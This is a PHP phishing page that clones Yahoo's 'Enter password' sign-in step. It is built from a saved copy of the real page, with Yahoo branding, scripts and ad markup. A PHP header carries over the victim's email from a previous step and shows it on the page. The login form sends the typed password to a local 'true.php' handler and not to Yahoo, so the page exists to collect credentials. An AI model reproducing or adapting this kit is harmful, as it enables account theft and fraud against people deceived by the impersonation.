<?php 
session_start();
$_SESSION['email']=$_POST['email'];

?>
<!DOCTYPE html>
<html id="Stencil" class="js grid light-theme "><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <link rel="dns-prefetch" href="https://gstatic.com/">
        <link rel="dns-prefetch" href="https://google.com/">
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">

        <style nonce="M4gnm3ddKAxvLHA3lVuKLHPu+5Gkm11iGmJh/iJ7feIf6X4z">
            #mbr-css-check {
                display: inline;
            }
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>
        <link href="mbr/yahoo-main.css" rel="stylesheet" type="text/css">
        <script nonce="M4gnm3ddKAxvLHA3lVuKLHPu+5Gkm11iGmJh/iJ7feIf6X4z">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 794200019;
root.I13N_config.location = "https:\u002F\u002Flogin.yahoo.com\u002Faccount\u002Fchallenge\u002Fpassword?.lang=en-US&.intl=us&src=ym&display=login";
root.I13N_config.referrer = "https:\u002F\u002Flogin.yahoo.com\u002F?.src=ym&.lang=en-US&.intl=us";
root.I13N_config.keys || (root.I13N_config.keys = {});
root.I13N_config.keys.pct = "sign-in";
root.I13N_config.keys.pg_name = "yahoo Login - Password Challenge";
root.I13N_config.keys.pstcat = "username-verify";
root.I13N_config.keys.gm_np = "yahoo";
root.I13N_config.keys.p_sec = "login";
root.I13N_config.keys.p_subsec = "account-challenge-password";
root.I13N_config.keys.src = "ym";
root.I13N_config.keys.test = "mbr-oneflow-with-ar,mbr-oneflow,mbr-oneflow-email,mbr-login-grid,mbr-phone-verification-grid,mbr-email-verification-grid,mbr-auto-submit,mbr-image-text-field,mbr-font-makeover";
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=794200019&ref=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Fpassword","k2Rate":1,"positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":5000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1584694950982;
root.I13N_config.keys.context = "primary";
root.mKeyPrefix = "primary-login-account-challenge-password-";
root.pwchallenge || (root.pwchallenge = {});
root.pwchallenge.messages = {"toolTipShow":"Show password","toolTipHide":"Hide password"};
root.isIOSDevice = false;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=96g3lb9f791l6&crumb=' + encodeURIComponent('iE439eVIWT8') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };

        </script>

    <script type="text/x-safeframe-booted" id="sf_tag_1584694953857_87">{"positions":[{"id":"RICH","html":"<script type='text\/javascript'>document.write(\"<!--*\\n\");\r\ndocument.write(\"var aolAdId=\\\"10531184|26614036\\\";\\n\");\r\ndocument.write(\"var aolSize=\\\"1440|1024\\\";\\n\");\r\ndocument.write(\"var aolFormat=\\\"3rdPartyRichMediaRedirect\\\";\\n\");\r\ndocument.write(\"var aolGUID=\\\"1584694952|9303006688313704\\\";\\n\");\r\ndocument.write(\"var alias=\\\"\\\";\\n\");\r\ndocument.write(\"var alias2=\\\"y963896142\\\";\\n\");\r\ndocument.write(\"*-->\\n\");\nvar apiUrl=\"https:\/\/oao-js-tag.onemobile.yahoo.com\/admax\/adMaxApi.do\";var adServeUrl=\"https:\/\/oao-js-tag.onemobile.yahoo.com\/admax\/adServe.do\";function AdMaxAdClient(){var b=Math.floor(Math.random()*1000000);this.scriptId=\"ScriptId_\"+b;this.divId=\"ad\"+b;this.renderAd=function(a){var d=document.createElement(\"script\");d.setAttribute(\"src\",a);d.setAttribute(\"id\",this.scriptId);document.write('<div id=\"'+this.divId+'\" style=\"text-align:center;\">');document.write('<script type=\"text\/javascript\" id=\"'+this.scriptId+'\" src=\"'+a+'\" ><\\\/script>');document.write(\"<\/div>\")},this.buildRequestURL=function(a,g){var h=a+\"?cTag=\"+this.divId;for(i in g){h+=\"&\"+i+\"=\"+escape(g[i])}return h},this.getAd=function(d){var a=this.buildRequestURL(adServeUrl,d);this.renderAd(a)}}var params;function admaxAdCallback(){params.ua=navigator.userAgent;params.of=\"js\";var c=getSd();if(c){params.sd=c}var d=new AdMaxClient();d.admaxAd(params)}function admaxAd(d){d.ua=navigator.userAgent;d.of=\"js\";var f=getSd();if(f){d.sd=f}var e=new AdMaxAdClient();e.getAd(d)}function getXMLHttpRequest(){if(window.XMLHttpRequest){if(typeof XDomainRequest!=\"undefined\"){return new XDomainRequest()}else{return new XMLHttpRequest()}}else{return new ActiveXObject(\"Microsoft.XMLHTTP\")}}function includeJS(c,j,d){var g=Math.floor(Math.random()*1000000);var b=\"ad\"+g;var k=\"ScriptId_\"+g;document.write('<div id=\"'+b+'\" style=\"text-align:center;\">');document.write('<script type=\"text\/javascript\" id=\"'+k+'\" >');document.write(j);document.write(\"<\\\/script>\");document.write(\"<\/div>\");if(d){d()}}function encodeParams(c){var d=\"\";for(i in c){d+=\"&\"+i+\"=\"+escape(c[i])}return d}function log(b){}function are_cookies_enabled(){var b=(navigator.cookieEnabled)?true:false;if(typeof navigator.cookieEnabled==\"undefined\"&&!b){document.cookie=\"testnx\";b=(document.cookie.indexOf(\"testnx\")!=-1)?true:false}return(b)}function readCookie(c){if(document.cookie){var j=c+\"=\";var g=document.cookie.split(\";\");for(var k=0;k<g.length;k++){var h=g[k];while(h.charAt(0)==\" \"){h=h.substring(1,h.length)}if(h.indexOf(j)==0){return h.substring(j.length,h.length)}}}return null}function generateGuid(){return\"xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx\".replace(\/[xy]\/g,function(f){var c=Math.random()*16|0,e=f==\"x\"?c:(c&3|8);return e.toString(16)})}function createCookie(k,j,h){var g=\"\";if(h){var f=new Date();f.setTime(f.getTime()+(h*24*60*60*1000));g=\";expires=\"+f.toGMTString()}else{g=\"\"}document.cookie=k+\"=\"+j+g+\"; path=\/\"}function getSuid(){if(are_cookies_enabled()){var d=readCookie(\"nexagesuid\");if(d){return d}else{var c=generateGuid();createCookie(\"nexagesuid\",c,365)}}return null}function getSd(){if(are_cookies_enabled()){var b=readCookie(\"nexagesd\");if(b){b++;if(b>10){return\"0\"}createCookie(\"nexagesd\",b,0.01);return b}else{createCookie(\"nexagesd\",1,0.01);return 1}}return null};\nvar suid = getSuid();\nvar admax_vars = {\n\"brxdSectionId\": \"\",\n\"brxdPublisherId\": \"20459933223\",\n\"ypubblob\": \"|xWd5kjEwLjL.bH67XnNs3QGLMTEwLgAAAACLtvwq|794200019|RICH|694951547\",\n\"req(url)\": \"https:\/\/login.yahoo.com\/account\/challenge\/password\",\n\"secure\": \"1\",\n\"brxdSiteId\": \"4465551\",\n\"dcn\": \"brxd4465551\",\n\"yadpos\": \"\",\n\"pos\": \"y963896142\",\n\"csrtype\": \"5\",\n\"ybkt\": \"\",\n\"us_privacy\": \"\",\n\"wd\": \"1440\",\n\"ht\": \"1024\"\n};\nif (suid) admax_vars[\"u(id)\"]=suid;\nadmaxAd(admax_vars);\n\n\n\n\ndocument.write(\"<!--*\\n\");\ndocument.write(\"var moatClientLevel1=5113\\n\");\ndocument.write(\"var moatClientLevel2=374058\\n\");\ndocument.write(\"var moatClientLevel3=0\\n\");\ndocument.write(\"var moatClientLevel4=5043043\\n\");\ndocument.write(\"var zMoatMaster=10433389\\n\");\ndocument.write(\"var zMoatFlight=10531184\\n\");\ndocument.write(\"var zMoatBanner=26614036\\n\");\ndocument.write(\"var zURL=https\\n\");\ndocument.write(\"var zMoatPlacementId=5043043\\n\");\ndocument.write(\"var zMoatPlacementExtId=963896142\\n\");\ndocument.write(\"var zMoatAdId=10531184\\n\");\ndocument.write(\"var zMoatCreative=0\\n\");\ndocument.write(\"var zMoatBannerID=4\\n\");\ndocument.write(\"var zMoatCustomVisp=50\\n\");\ndocument.write(\"var zMoatCustomVist=1000\\n\");\ndocument.write(\"var zMoatIsAdvisGoal=0\\n\");\ndocument.write(\"var zMoatEventUrl=https:\/\/as.y.atwola.com\/adcount|2.0|5113.1|5043043|0|5112|AdId=10531184;BnId=4;ct=2344049797;st=4945;adcid=1;itime=694951547;reqtype=5;guid=fsr3undf76r6t&b=3&s=0n;;impref=15846949522223518919;imprefseq=9303006688313704;imprefts=1584694952;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=xWd5kjEwLjL.bH67XnNs3QGLMTEwLgAAAACLtvwq;sectionid=;kvsecure%2Ddarla=3%2D24%2D0%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=sg3;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;\\n\");\ndocument.write(\"var zMoatSize=5112\\n\");\ndocument.write(\"var zMoatSubNetID=1\\n\");\ndocument.write(\"var zMoatisSelected=0\\n\");\ndocument.write(\"var zMoatadServer=as.y.atwola.com\\n\");\ndocument.write(\"var zMoatadVisServer=\\n\");\ndocument.write(\"var zMoatSamplingRate=5\\n\");\ndocument.write(\"var zMoatliveTestCookie=\\n\");\ndocument.write(\"var zMoatRefSeqId=oFAAJkQDhAA\\n\");\ndocument.write(\"var zMoatImpRefTs=1584694952\\n\");\ndocument.write(\"var zMoatAlias=y963896142\\n\");\ndocument.write(\"var zMoatWebsiteID=374058\\n\");\ndocument.write(\"var zMoatVert=\\n\");\ndocument.write(\"var zMoatBannerInfo=491297721\\n\");\ndocument.write(\"var RefreshSmall=\\n\");\ndocument.write(\"var RefreshLarge=\\n\");\ndocument.write(\"var RefreshExclusive=\\n\");\ndocument.write(\"var RefreshReserved=\\n\");\ndocument.write(\"var RefreshTime=\\n\");\ndocument.write(\"var RefreshMax=\\n\");\ndocument.write(\"var RefreshKeepSize=\\n\");\ndocument.write(\"var MP=N\\n\");\ndocument.write(\"var AdTypePriority=140\\n\");\ndocument.write(\"*-->\\n\");\ndocument.write(\"<scr\"+\"ipt src=\\\"\"+(window.location.protocol=='https:' ? \"https:\/\/aka-cdn.adtechus.com\" : \"http:\/\/aka-cdn-ns.adtechus.com\")+\"\/media\/moat\/adtechbrands092348fjlsmdhlwsl239fh3df\/moatad.js#moatClientLevel1=5113&moatClientLevel2=374058&moatClientLevel3=0&moatClientLevel4=5043043&zMoatMaster=10433389&zMoatFlight=10531184&zMoatBanner=26614036&zURL=https&zMoatPlacementId=5043043&zMoatAdId=10531184&zMoatCreative=0&zMoatBannerID=4&zMoatCustomVisp=50&zMoatCustomVist=1000&zMoatIsAdvisGoal=0&zMoatEventUrl=https:\/\/as.y.atwola.com\/adcount|2.0|5113.1|5043043|0|5112|AdId=10531184;BnId=4;ct=2344049797;st=5043;adcid=1;itime=694951547;reqtype=5;guid=fsr3undf76r6t&b=3&s=0n;;impref=15846949522223518919;imprefseq=9303006688313704;imprefts=1584694952;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=xWd5kjEwLjL.bH67XnNs3QGLMTEwLgAAAACLtvwq;sectionid=;kvsecure%2Ddarla=3%2D24%2D0%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=sg3;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;&zMoatSize=5112&zMoatSubNetID=1&zMoatisSelected=0&zMoatadServer=as.y.atwola.com&zMoatadVisServer=&zMoatSamplingRate=5&zMoatliveTestCookie=&zMoatRefSeqId=oFAAJkQDhAA&zMoatImpRefTs=1584694952&zMoatAlias=y963896142&zMoatVert=&zMoatBannerInfo=491297721\\\" type=\\\"text\/javascript\\\"><\/scr\"+\"ipt>\");\n<\/script>","lowHTML":"","meta":{"y":{"pos":"RICH","cscHTML":"<img width=1 height=1 alt=\"\" src=\"https:\/\/as.y.atwola.com\/adcount|2.0|5113.1|5043043|0|5112|AdId=10531184;BnId=4;ct=2344049797;st=5225;adcid=1;itime=694951547;reqtype=5;guid=fsr3undf76r6t&b=3&s=0n;;impref=15846949522223518919;imprefseq=9303006688313704;imprefts=1584694952;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=xWd5kjEwLjL.bH67XnNs3QGLMTEwLgAAAACLtvwq;sectionid=;kvsecure%2Ddarla=3%2D24%2D0%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=sg3;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;\">","cscURI":"https:\/\/as.y.atwola.com\/adcount|2.0|5113.1|5043043|0|5112|AdId=10531184;BnId=4;ct=2344049797;st=5225;adcid=1;itime=694951547;reqtype=5;guid=fsr3undf76r6t&b=3&s=0n;;impref=15846949522223518919;imprefseq=9303006688313704;imprefts=1584694952;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=xWd5kjEwLjL.bH67XnNs3QGLMTEwLgAAAACLtvwq;sectionid=;kvsecure%2Ddarla=3%2D24%2D0%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=sg3;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;","behavior":"non_exp","adID":"10531184","matchID":"999999.999999.999999.999999","bookID":"10531184","slotID":"0","serveType":"8","ttl":-1,"err":false,"hasExternal":false,"supp_ugc":"0","placementID":"10531184","fdb":null,"serveTime":-1,"impID":"-1","creativeID":26614036,"adc":"{\"label\":\"AdChoices\",\"url\":\"https:\\\/\\\/info.yahoo.com\\\/privacy\\\/us\\\/yahoo\\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}","is3rd":1,"facStatus":{"fedStatusCode":"31","fedStatusMessage":"Yield optimization did not run"},"userProvidedData":{},"facRotation":{},"slotData":{"trusted_custom":"false","freqcapped":"false","delivery":"1","pacing":"1","expires":"1625111940","companion":"false","exclusive":"false","redirect":"true","pvid":"xWd5kjEwLjL.bH67XnNs3QGLMTEwLgAAAACLtvwq"},"size":"1440x1024"}},"conf":{"w":1440,"h":1024}}],"conf":{"useYAC":0,"usePE":1,"servicePath":"","xservicePath":"","beaconPath":"","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-24-0\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/3-24-0\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-24-0\/html\/r-sf.html","msgPath":"https:\/\/fc.yahoo.com\/unsupported-1946.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/3-24-0\/html\/r-csc.html","root":"sdarla","edgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-24-0","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-24-0","version":"3-24-0","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/3-24-0\/js\/g-r-min.js","fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now","positions":{"RICH":{"dest":"tgtRICH","asz":"flex","id":"RICH","w":1440,"h":1024}},"property":"","events":[],"lang":"en-us","spaceID":"794200019","debug":false,"asString":"{\"useYAC\":0,\"usePE\":1,\"servicePath\":\"\",\"xservicePath\":\"\",\"beaconPath\":\"\",\"renderPath\":\"\",\"allowFiF\":false,\"srenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-24-0\\\/html\\\/r-sf.html\",\"renderFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-24-0\\\/html\\\/r-sf.html\",\"sfbrenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-24-0\\\/html\\\/r-sf.html\",\"msgPath\":\"https:\\\/\\\/fc.yahoo.com\\\/unsupported-1946.html\",\"cscPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-24-0\\\/html\\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-24-0\",\"sedgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-24-0\",\"version\":\"3-24-0\",\"tpbURI\":\"\",\"hostFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-24-0\\\/js\\\/g-r-min.js\",\"fdb_locale\":\"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now\",\"positions\":{\"RICH\":{\"dest\":\"tgtRICH\",\"asz\":\"flex\",\"id\":\"RICH\",\"w\":1440,\"h\":1024}},\"property\":\"\",\"events\":[],\"lang\":\"en-us\",\"spaceID\":\"794200019\",\"debug\":false}"},"meta":{"y":{"pageEndHTML":"<!-- Page End HTML -->","pos_list":["RICH"],"transID":"darla_prefetch_1584694952412_444851085_3","k2_uri":"","fac_rt":-1,"ttl":-1,"spaceID":"794200019","lookupTime":24,"procTime":25,"npv":0,"pvid":"xWd5kjEwLjL.bH67XnNs3QGLMTEwLgAAAACLtvwq","serveTime":-1,"ep":{"site-attribute":"","tgt":"_blank","secure":true,"ref":"https:\/\/login.yahoo.com\/account\/challenge\/password","filter":"no_expandable;exp_iframe_expandable;","darlaID":"darla_instance_1584694952412_89345864_2"},"pym":{".":"v0.0.9;;-;"},"host":"","filtered":[],"pe":""}}}</script><script type="text/javascript" src="mbr/boot.js"></script><script id="sf_host_lib_sf_auto_5-20-2-2020" type="text/javascript" class="sf_lib" src="mbr/g-r-min.js"></script></head>
    <body class="bucket-mbr-oneflow-with-ar bucket-mbr-oneflow bucket-mbr-oneflow-email bucket-mbr-login-grid bucket-mbr-phone-verification-grid bucket-mbr-email-verification-grid bucket-mbr-auto-submit bucket-mbr-image-text-field bucket-mbr-font-makeover">
        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross">
            <p class="mbr-legacy-device">
                    Yahoo works best with the latest versions of the 
browsers. You're using an outdated or unsupported browser and some Yahoo
 features may not work properly. Please update your browser version now.
 <a href="">More&nbsp;Info</a>
            </p>
        </div>
    <script nonce="M4gnm3ddKAxvLHA3lVuKLHPu+5Gkm11iGmJh/iJ7feIf6X4z">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div id="login-body" class="loginish puree-v2 grid dark-background">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.yahoo.com/">
            <img src="mbr/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
            <img src="mbr/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT">Help</a>
    </span>
</div>
    <div class="login-box-container">
        <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
                    <img src="mbr/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
                    <img src="mbr/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
            </div>
            <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid"><?php echo $_SESSION['email'];?></div>
</div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter&nbsp;password</strong>
    <span class="txt-align-center challenge-desc">to finish sign&nbsp;in</span>
    <form action="true.php" method="post" class="pure-form challenge-form">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:&quot;unknown&quot;,&quot;pixelRatio&quot;:1,&quot;hardwareConcurrency&quot;:4,&quot;timezoneOffset&quot;:-420,&quot;timezone&quot;:&quot;Asia/Jakarta&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Win32&quot;,&quot;doNotTrack&quot;:&quot;unspecified&quot;,&quot;plugins&quot;:{&quot;count&quot;:1,&quot;hash&quot;:&quot;d33856a5334ea6ee43c8674096e2cf82&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc.~ANGLE (Intel(R) HD Graphics Direct3D11 vs_5_0 ps_5_0)&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:0,&quot;hasLiedBrowser&quot;:1,&quot;touchSupport&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:52,&quot;hash&quot;:&quot;5c9a905b41cf3aeffacf7e10f1e3631a&quot;},&quot;audio&quot;:&quot;35.7383295930922&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1600&quot;,&quot;h&quot;:&quot;900&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;860&quot;,&quot;h&quot;:&quot;1600&quot;},&quot;ts&quot;:{&quot;serve&quot;:1584694950982,&quot;render&quot;:1584694954894}}">
        <input type="hidden" name="crumb" value="iE439eVIWT8">
        <input type="hidden" name="acrumb" value="o0TM0ary">
        <input type="hidden" name="sessionIndex" value="QQ--">
        <input type="hidden" name="displayName" value="<?php echo $_SESSION['email'];?>">        <div class="hidden-username">
			<input name="email" value="<?php echo $_SESSION['email'];?>" type="hidden">

            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="email" value="<?php echo $_SESSION['email'];?>">
        </div>
        <input type="hidden" name="passwordContext" value="normal">
        <div id="password-container" class="input-group password-container blurred">
            <input type="password" id="login-passwd" class="password" name="password" placeholder=" " autofocus="" autocomplete="current-password">
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password"></button>
        </div>

        <div class="button-container">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-ylk="elm:btn;elmt:primary;mKey:primary-login-account-challenge-password-primaryBtn">
                    Next
            </button>
        </div>
        <div class="forgot-cont bottom-cta">
            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:primary-login-account-challenge-password-skipBtn" id="mbr-forgot-link" name="skip" value="Forgot&nbsp;password?">
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, 
finance, sports, music, movies and more. You get more out of the web, 
you get more out of&nbsp;life.</p>
        </div>
    </div>
    <div class="login-bg-outer">
        <div class="login-bg-inner"><div id="login-ad-rich" style="visibility: inherit;"></div></div>
    </div>
</div>
    <script src="mbr/rapid-3.js"></script>
    <script nonce="M4gnm3ddKAxvLHA3lVuKLHPu+5Gkm11iGmJh/iJ7feIf6X4z">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
        // Used in common JS to add to beacons
        rapidInstance.beaconClick('page_load_click_evnt' , null, 0, {
            mKey: 'primary-login-account-challenge-password-launch',
            intrctn: 'click',
            corActn: 'click'
        });
    </script>
    <script src="mbr/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=iE439eVIWT8&message=javascript_not_enabled&ref=%2Faccount%2Fchallenge%2Fpassword" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="M4gnm3ddKAxvLHA3lVuKLHPu+5Gkm11iGmJh/iJ7feIf6X4z">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>


<script src="mbr/client.php"></script><div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="mbr/r-csc.htm" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0" frameborder="no"></iframe></div></body><script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like Gecko"})</script></html>
<!-- fe05.member.sg3.yahoo.com - Fri Mar 20 2020 09:02:30 GMT+0000 (Coordinated Universal Time) - (1ms) -->